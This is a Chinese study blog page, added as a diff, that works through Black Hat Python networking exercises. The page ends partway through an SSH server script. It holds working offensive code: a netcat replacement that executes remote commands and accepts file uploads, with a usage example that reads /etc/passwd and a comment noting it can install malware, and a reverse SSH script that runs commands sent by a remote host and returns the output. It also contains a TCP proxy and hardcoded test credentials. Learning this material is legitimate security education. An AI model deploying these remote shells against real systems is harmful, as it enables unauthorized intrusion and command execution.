@@ -1,0 +1,1527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">Python黑帽子-网络基础 | 0xGeekCat</title>
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "Mаксим0xGeekCat";
+  mashiro_option.author_name = "0xGeekCat";
+  mashiro_option.site_url = "https://0xgeekcat.github.io/";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "0";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20ls%20black_hair%20f%20toriki%20touhou.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-293503-ghostblade-long_hair-red_hair-sword-tagme_character-thighhighs-weapon-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-298784-aeolian_wlop-barefoot-black_hair-braids-ghostblade-headdress-long_hair-ponytail-wlop-scaled.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com%20-%20227403%20black_hair%20ghostblade%20jade_(wlop)%20japanese_clothes%20kimono%20logo%20realistic%20short_hair%20tattoo%20umbrella%20wlop.jpg,https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/images/Konachan.com-281267-aeolian_wlop-black_hair-bow_weapon-close-ghostblade-green_eyes-logo-long_hair-realistic-watermark-weapon-wink-wlop-scaled.jpg".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dim">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://0xgeekcat.github.io/">
+          <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>用来记录我大学最后生涯破釜沉舟力挽狂澜的疯狂学习历程</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="https://github.com/0xGeekCat" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=1292881925@qq.com" target="_blank" class="social-github" title="email">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/email.svg">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/0xGeekCat/cdn@2.2/img/custom/wechat.jpg">
+                  </div>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">Mаксим</span>
+            <span class="shironeko">0xGeekCat</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          技术
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          转载
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    书单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/tags/%E5%B7%B2%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          已读
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags/%E6%9C%AA%E8%AF%BB/">
+                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
+                          未读
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+          <header class="entry-header">
+            <h1 class="entry-title">Python黑帽子-网络基础</h1>
+            <p class="entry-census">0xGeekCat&nbsp;·&nbsp;2020-8-9&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
+        <div class="entry-content">
+          <h1 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h1><pre><code class="python">import socket
+
+target_host = &#39;0.0.0.0&#39;
+target_port = 9998
+
+# 建立socket对象，AF_INEF表明使用标准IPv4地址或主机名，SOCK_STREAM为TCP客户端
+clint = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# 客户端连接服务器
+clint.connect((target_host, target_port))
+
+# 发送数据
+clint.send(b&quot;ABCDEF&quot;)
+
+# 接收数据
+request = clint.recv(4096)
+
+print(request)</code></pre>
+<h1 id="UDP客户端"><a href="#UDP客户端" class="headerlink" title="UDP客户端"></a>UDP客户端</h1><pre><code class="python">import socket
+
+target_host = &quot;127.0.0.1&quot;
+target_post = 80
+
+# 建立socket对象，SOCK_DGRAM为UDP客户端
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# 发送数据 UDP为无连接状态传输协议，不需要connect()
+client.sendto(b&quot;AAABBBCCC&quot;, (target_host, target_post))
+
+# 接收回传数据及远程主机信息和端口号
+data, addr = client.recvfrom(4096)
+
+print(data)</code></pre>
+<h1 id="TCP服务器"><a href="#TCP服务器" class="headerlink" title="TCP服务器"></a>TCP服务器</h1><pre><code class="python">import socket
+import threading
+
+bind_ip = &quot;0.0.0.0&quot;
+bind_port = 9998
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# 启动监听
+server.bind((bind_ip, bind_port))
+
+# 最大连接数设为5
+server.listen(5)
+
+print(&quot;[*] Listening on %s:%d&quot; % (bind_ip, bind_port))
+
+# 处理客户端线程
+def handle_client(client_socket):
+
+    # 打印客户端发送内容
+    request = client_socket.recv(1024)
+
+    print(&quot;[*] Received: %s&quot; % request)
+
+    # 返回数据包
+    client_socket.send(b&quot;ACK!&quot;)
+
+    client_socket.close()
+
+
+# 服务端进入主循环，等待连接
+while True:
+
+    # 接收客户端套接字对象对象存储于client，远程连接细节存储于addr
+    client, addr = server.accept()
+
+    print(&quot;[*] Accepted connection from: %s:%d&quot; % (addr[0], addr[1]))
+
+    # 挂起客户端线程，处理传入数据
+    client_handler = threading.Thread(target=handle_client, args=(client,))
+
+    # 启动线程处理客户端连接
+    client_handler.start()</code></pre>
+<h1 id="取代netcat"><a href="#取代netcat" class="headerlink" title="取代netcat"></a>取代netcat</h1><pre><code class="python">import sys
+import socket
+import getopt
+import threading
+import subprocess
+
+listen = False
+command = False
+upload = False
+execute = &quot;&quot;
+target = &quot;&quot;
+upload_destination = &quot;&quot;
+port = 0
+
+
+def usage():
+    print(&quot;supersede NET Tool&quot;)
+    print()
+    print(&quot;Usage: supersedeNetCat.py -t target_host -p post&quot;)
+    print(&quot;-l --listen                - listen on [host]:[post] for incoming connections&quot;)
+    print(&quot;-e --execute=file_to_run   - execute the given file upon receiving a connection&quot;)
+    print(&quot;-c --command               - initialize a command shell&quot;)
+    print(&quot;-u --upload=destination    - upon receiving connection upload a file and write to [destination]&quot;)
+    print()
+    print()
+    print(&quot;Examples: &quot;)
+    print(&quot;python3 supersedeNetCat.py -t 192.168.0.1 -p 5555 -l -c&quot;)
+    print(&quot;python3 supersedeNetCat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;)
+    print(&quot;python3 supersedeNetCat.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;)
+    print(&quot;echo &#39;ABCDEFGHI&#39; | python3 supersedeNetCat.py -t 192.168.11.12 -p 135&quot;)
+    sys.exit(0)
+
+
+def main():
+
+    # 对global变量进行修改
+    global listen
+    global port
+    global execute
+    global command
+    global upload_destination
+    global target
+
+    if not len(sys.argv[1:]):
+        usage()
+
+    # 读取命令行选项，:表示参数必须有值
+    try:
+        opts, args = getopt.getopt(sys.argv[1:], &quot;hle:t:p:cu&quot;,
+                                   [&quot;help&quot;, &quot;listen&quot;, &quot;execute&quot;, &quot;target&quot;, &quot;port&quot;, &quot;command&quot;, &quot;upload&quot;])
+    except getopt.GetoptError as err:
+        print(err)
+        print()
+        usage()
+
+    for o, a in opts:
+        if o in (&quot;-h&quot;, &quot;--help&quot;):
+            usage()
+        elif o in (&quot;-l&quot;, &quot;--listen&quot;):
+            listen = True
+        elif o in (&quot;-e&quot;, &quot;--execute&quot;):
+            execute = a
+        elif o in (&quot;-c&quot;, &quot;--command&quot;):
+            command = True
+        elif o in (&quot;-u&quot;, &quot;--upload&quot;):
+            upload_destination = a
+        elif o in (&quot;-t&quot;, &quot;--target&quot;):
+            target = a
+        elif o in (&quot;-p&quot;, &quot;--port&quot;):
+            port = int(a)
+        else:
+            # assert条件为false触发异常
+            assert False, &quot;Unhandled Option&quot;
+
+    # 模仿netcat从标准输入中读取数据并通过网络发送数据
+    # 如果需要交互式地发送数据，需要发送CTRL-D以避免从标准输入中读取数据
+    # sys.stdin.read阻塞进程执行，EOF结束输入，之后进程继续执行到client_sender
+    if not listen and len(target) and port &gt; 0:
+
+        # 从命令行读取string类型数据，这里将堵塞，直到接收EOF(文件结尾)标志
+        buffer = sys.stdin.read()
+
+        # 发送数据
+        client_sender(buffer)
+
+    # print(123)
+
+    # 检测listen参数为True，建立监听套接字，准备处理下一步命令(上传文件，执行命令，开启新命令行shell)
+    if listen:
+        server_loop()
+
+
+def client_sender(buffer):
+
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # 连接目标主机
+        client.connect((target, port))
+
+        # 检测是否已经从标准输入中接收到数据，如果正常就将数据发送给远程目标主机
+        if len(buffer):
+            client.send(buffer.encode())
+
+        while True:
+
+            # 现在等待数据回传
+            recv_len = 1
+            response = &quot;&quot;
+
+            # 接收回传数据直到没有更多数据发送回来
+            while recv_len:
+
+                data = client.recv(4096).decode()
+                recv_len = len(data)
+                response += data
+
+                if recv_len &lt; 4096:
+                    break
+
+            print(response, end=&quot;&quot;)
+
+            # 等待更多输出
+            buffer = input(&quot;&quot;)
+            buffer += &quot;\n&quot;
+
+            # 发送数据，encode默认编码UTF-8，将string转变为byte
+            client.send(buffer.encode())
+
+    except:
+
+        print(&quot;[*] Exception! Exiting.&quot;)
+
+        # 关闭连接
+        client.close()
+
+
+def server_loop():
+
+    global target
+
+    # 如果没有定义目标就监听所有接口
+    if not len(target):
+        target = &quot;0.0.0.0&quot;
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((target, port))
+
+    server.listen(5)
+
+    while True:
+        client_socket, addr = server.accept()
+
+        # 分拆一个线程处理新客户端
+        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
+        client_thread.start()
+
+
+def run_command(cmd):
+
+    # subprocess库提供强大的进程创建接口，提供多种与客户端程序交互的方法
+
+    # rstrip删除字符串尾部空字符
+    cmd = cmd.rstrip()
+
+    # 运行命令并将输出返回
+    try:
+        # subprocess.check_output返回shell命令执行结果，参数shell=True可以传入字符串shell命令而不是shell命令列表，参数stderr=subprocess.STDOUT捕获错误，使错误通过标准输出流输出
+        # 运行用户输入的命令，在目标操作系统中运行，然后通过连接将命令结果回传到用户控制的客户端
+        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)  # 返回bytes类型
+    except:
+        output = &quot;Failed to execute command.\r\n&quot;.encode()
+
+    # 发送输出
+    return output
+
+
+def client_handler(client_socket):
+
+    global upload
+    global execute
+    global command
+
+    # 检测建立连接之后是否设置为接收文件，有助于用户上传测试脚本、安装恶意软件或让恶意软件清除Python脚本
+    if len(upload_destination):
+
+        # 读取所有字符并写下目标
+        file_buffer = &quot;&quot;
+
+        # 持续读取数据，保证数据完全接收
+        while True:
+            data = client_socket.recv(1024)
+
+            if not data:
+                break
+            else:
+                file_buffer += data
+
+        # 编写数据，wb标识确保上传和写入的二进制文件可以成功执行
+        try:
+            file_descriptor = open(upload_destination, &quot;wb&quot;)
+            file_descriptor.write(file_buffer.encode())
+            file_descriptor.close()
+            # 确认文件写入
+            client_socket.send(&quot;Successfully saved file to %s\r\n&quot;.encode() % upload_destination)
+        except:
+            client_socket.send(&quot;Failed saved file to %s\r\n&quot;.encode() % upload_destination)
+
+    # 检测命令执行
+    if len(execute):
+        # 运行命令
+        output = run_command(execute)
+
+        client_socket.send(output.encode())
+
+    # 命令行shell，程序持续处理输入的数据执行命令并输出回传
+    if command:
+
+        while True:
+            # 跳出窗口
+            client_socket.send(&quot;\033[36m&lt;Shell:#&gt;\033[0m&quot;.encode())
+
+            # 接收文件直到发现换行符(enter key)
+            cmd_buffer = &quot;&quot;
+            while &quot;\n&quot; not in cmd_buffer:
+                cmd_buffer += client_socket.recv(1024).decode()
+
+                # 返回命令输出
+                response = run_command(cmd_buffer)
+
+                # 返回相应数据
+                client_socket.send(response)
+
+
+main()
+</code></pre>
+<h1 id="TCP代理"><a href="#TCP代理" class="headerlink" title="TCP代理"></a>TCP代理</h1><pre><code class="python">import sys
+import socket
+import threading
+
+
+def main():
+
+    # 没有华丽的命令解析
+    if len(sys.argv[1:]) != 5:
+        print(&quot;Usage: python3 tcpProxy.py [localhost] [localport] [remotehost] [remoteport] [receivefirst]&quot;)
+        print(&quot;Example: python3 tcpProxy.py 127.0.0.1 9000 10.12.132.1 9000 True&quot;)
+        sys.exit(0)
+
+    # 设置本地监听参数
+    local_host = sys.argv[1]
+    local_port = int(sys.argv[2])
+
+    # 设置远程目标
+    remote_host = sys.argv[3]
+    remote_port = int(sys.argv[4])
+
+    # 告诉代理在发送给远程主机之前连接和接收数据
+    receive_first = sys.argv[5]
+
+    if &quot;True&quot; in receive_first:
+        receive_first = True
+    else:
+        receive_first = False
+
+    # 监听socket
+    server_loop(local_host, local_port, remote_host, remote_port, receive_first)
+
+
+# 本地TCP代理服务器
+def server_loop(local_host, local_port, remote_host, remote_port, receive_first):
+
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        server.bind((local_host, local_port))
+    except:
+        print(&quot;[!] Failed to listen on %s:%d&quot; % (local_host, local_port))
+        print(&quot;[!] Check for other listening sockets or correct permissions&quot;)
+        sys.exit(0)
+
+    print(&quot;[*] Listening on %s:%d&quot; % (local_host, local_port))
+
+    server.listen(5)
+
+    while True:
+        client_socket, addr = server.accept()
+
+        # 打印本地连接信息
+        print(&quot;\033[36m[==&gt;] Received incoming connection from %s:%d\033[0m&quot; % (addr[0], addr[1]))
+
+        # 开启一个线程与远程主机通信
+        proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket, remote_host, remote_port, receive_first))
+
+        proxy_thread.start()
+
+
+def proxy_handler(client_socket, remote_host, remote_port, receive_first):
+
+    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    remote_socket.connect((remote_host, remote_port))
+
+    # 如果必须先从远处主机接收数据，确保不向远程主机主动发送数据
+    if receive_first:
+
+        # 一些作为服务的进程会做例如FTP服务器一般会先发送旗标的行为
+        # receive_from使用套接字对象实现数据接收
+        remote_buffer = receive_from(remote_socket)
+        # 转存数据包负载，查看里面是否有感兴趣的内容
+        hexdump(remote_buffer)
+
+        # 将接收数据发送给响应处理
+        # response_handler可以修改数据包内容，进行模糊测试任务，检测认证问题，修改输出流量
+        remote_buffer = response_handler(remote_buffer)
+
+        # 如果有数据传递给本地客户端，发送它
+        if len(remote_buffer):
+            print(&quot;\033[36m[&lt;==] Sending %d bytes to localhost.\033[0m&quot; % len(remote_buffer))
+            client_socket.send(remote_buffer)
+
+    # 从本地循环读取数据，发送给远程主机和本地主机
+    while True:
+
+        # 从本地读取数据
+        local_buffer = receive_from(client_socket)
+
+        if len(local_buffer):
+
+            print(&quot;\033[36m[==&gt;] Received %d bytes from localhost.\033[0m&quot; % len(local_buffer))
+            hexdump(local_buffer)
+
+            # 发送给本地请求
+            local_buffer = request_handler(local_buffer)
+
+            # 向远程主机发送数据
+            remote_socket.send(local_buffer)
+            print(&quot;\033[36m[==&gt;] Send to remote.\033[0m&quot;)
+
+        # 接收响应数据
+        remote_buffer = receive_from(remote_socket)
+
+        if len(remote_buffer):
+
+            print(&quot;\033[36m[==&gt;] Received %d bytes from remote.\033[0m&quot; % len(remote_buffer))
+            hexdump(remote_buffer)
+
+            # 发送到响应处理函数
+            remote_buffer = response_handler(remote_buffer)
+
+            # 将响应发送到本地
+            client_socket.send(remote_buffer)
+
+            print(&quot;\033[36m[&lt;==] Send to localhost.\033[0m&quot;)
+
+        # 如果两边都没有数据，关闭连接
+        if not len(local_buffer) or not len(remote_buffer):
+            client_socket.close()
+            remote_socket.close()
+            print(&quot;[*] No more data. Closing connections.&quot;)
+
+            break
+
+
+# 16进制导出函数，用于转储，将输出数据包的十六进制值和可打印的ASCII码字符
+# 对了解未知协议非常有用，还能找到使用明文协议的认证信息
+# http://code.activestate.com/recipes/142812-hex-dumper/
+def hexdump(src, length=16):
+    result = []
+    digits = 4 if isinstance(src, str) else 2
+
+    for i in range(0, len(src), length):
+        s = src[i:i + length]
+        hexa = &#39; &#39;.join([hex(x)[2:].upper().zfill(digits) for x in s])
+        text = &#39;&#39;.join([chr(x) if 0x20 &lt;= x &lt; 0x7F else &#39;.&#39; for x in s])
+        result.append(&quot;&#123;0:04X&#125;&quot;.format(i) + &#39; &#39; * 3 + hexa.ljust(length * (digits + 1)) + &#39; &#39; * 3 + &quot;&#123;0&#125;&quot;.format(text))
+
+    print(&#39;\n&#39;.join(result))
+
+
+# 用于接收本地和远程主机的数据，使用socket对象最为参数
+# socket默认超时设置为2秒，此设置对代理流量到其它国家或网速慢的网络过于苛刻(根据需要修改)
+def receive_from(connection):
+
+    buffer = b&quot;&quot;
+
+    # 设置两秒超时，根据目标情况调整
+    connection.settimeout(2)
+
+    try:
+        # 持续从缓存中读取数据知道没有数据或者超时
+        while True:
+            data = connection.recv(4096)
+
+            if not data:
+                break
+
+            buffer += data
+    except:
+        pass
+
+    return buffer
+
+
+# request_handler和response_handler允许修改代理双向数据流量
+
+# 修改远程主机请求
+def request_handler(buffer):
+
+    return buffer
+
+
+# 修改本地主机响应
+def response_handler(buffer):
+
+    return buffer
+
+
+main()
+</code></pre>
+<h1 id="SSH客户端"><a href="#SSH客户端" class="headerlink" title="SSH客户端"></a>SSH客户端</h1><pre><code class="python">import paramiko
+
+
+def ssh_command(ip, user, passwd, command):
+
+    client = paramiko.SSHClient()
+
+    # 支持用密钥认证代替密码验证，实际环境推荐使用密钥认证
+    # client.load_host_keys(&#39;&#39;)
+
+    # set_missing_host_key_policy()设置管理HostKeys策略
+    # paramiko.AutoAddPolicy()自动增加主机名和服务器主机密钥到本地的HostKeys对象并且保存它
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # 连接SSH服务器
+    client.connect(ip, username=user, password=passwd)
+
+    # client.get_transport().open_session()向服务器请求session
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+        # print(&quot;ssh_session:&quot;, ssh_session)
+        # 执行命令
+        ssh_session.exec_command(command)
+        # 输出响应
+        print(ssh_session.recv(1024).decode())
+
+    return
+
+
+ssh_command(&#39;#&#39;, &#39;#&#39;, &#39;#&#39;, &#39;id&#39;)
+</code></pre>
+<h1 id="反向SSH"><a href="#反向SSH" class="headerlink" title="反向SSH"></a>反向SSH</h1><pre><code class="python">import paramiko
+import subprocess
+
+
+def ssh_command(ip, user, passwd, command):
+
+    client = paramiko.SSHClient()
+
+    # client.save_host_keys()
+
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    client.connect(ip, username=user, password=passwd)
+
+    ssh_session = client.get_transport().open_session()
+
+    if ssh_session.active:
+
+        ssh_session.send(command)
+
+        print(ssh_session.recv(1024).decode())
+
+        while True:
+
+            command = ssh_session.recv(1024).decode()
+
+            try:
+
+                cmd_output = subprocess.check_output(command, shell=True)
+
+                ssh_session.send(cmd_output)
+
+            except Exception as e:
+
+                print(e)
+
+                ssh_session.send(str(e).encode())
+
+        client.close()
+
+    return
+
+
+ssh_command(&#39;10.173.168.26&#39;, &#39;root&#39;, &#39;123&#39;, &#39;ClientConnected&#39;)
+</code></pre>
+<h1 id="SSH服务器"><a href="#SSH服务器" class="headerlink" title="SSH服务器"></a>SSH服务器</h1><pre><code class="python">import socket
+import paramiko
+import threading
+import sys
+
+
+# 使用paramiko示例文件的密钥
+host_key = paramiko.RSAKey(filename=&#39;/Users/max/.ssh/id_rsa&#39;)
+
+
+# SSH管道设置
+class Server(paramiko.ServerInterface):
+
+    def __init__(self):
+
+        self.event = threading.Event()
+
+    def check_channel_request(self, kind, chanid):
+
+        if kind == &#39;session&#39;:
+            return paramiko.OPEN_SUCCEEDED
+
+    def check_auth_password(self, username, password):
+
+        if username == &#39;ssh&#39; and password == &#39;ssh&#39;:
+            return paramiko.AUTH_SUCCESSFUL
+
+        return paramiko.AUTH_FAILED
+
+
+server = sys.argv[1]
+ssh_port = int(sys.argv[2])
+
+# 开启socket监听
+try:
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # SOL_SOCKET表示正在使用的socket选项，SO_REUSEADDR表示当socket关闭后，本地端用于该socket的端口号立刻就可以被重用
+    # 1表示SO_REUSEADDR为TRUE，操作系统会在服务器socket被关闭或服务器进程终止后马上释放该服务器的端口，否则操作系统会保留几分钟该端口
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((server, ssh_port))
+    sock.listen(100)
+
+    print(&quot;[+] Listening for connection ...&quot;)
+    client, addr = sock.accept()
+except Exception as e:
+
+    print(&quot;[-] Listening failed:&quot;, str(e))
+    sys.exit(1)
+
+print(&quot;[+] Got a connection!&quot;)
+
+# 认证模式
+try:
+    session = paramiko.Transport(client)
+    print(&quot;session:&quot;, session)
+    # 将主机密钥添加到用于服务器模式的密钥列表中
+    session.add_server_key(host_key)
+
+    server = Server()
+
+    try:
+        # 启动SSH服务器
+        session.start_server(server=server)
+    except paramiko.SSHException as x:
+        print(&quot;[-] SSH negotiation failed.&quot;)
+
+    chan = session.accept(20)
+    # 客户端认证成功
+    print(&quot;[+] Authenticated!&quot;)
+    print(chan.recv(1024).decode())
+    chan.send(&quot;Welcome to ssh&quot;.encode())
+
+    # 发回ClientConnected消息
+    while True:
+
+        try:
+            command = input(&quot;Enter command: &quot;).strip()
+
+            if command != &#39;exit&#39;:
+                chan.send(command)
+                print(chan.recv(1024).decode() + &#39;\n&#39;)
+            else:
+                chan.send(&quot;exit!&quot;)
+                print(&quot;exiting&quot;)
+                session.close()
+                raise Exception(&#39;exit&#39;)
+        except KeyboardInterrupt:
+            session.close()
+except Exception as e:
+    print(&quot;[-] Caught exception:&quot;, str(e))
+
+    try:
+        session.close()
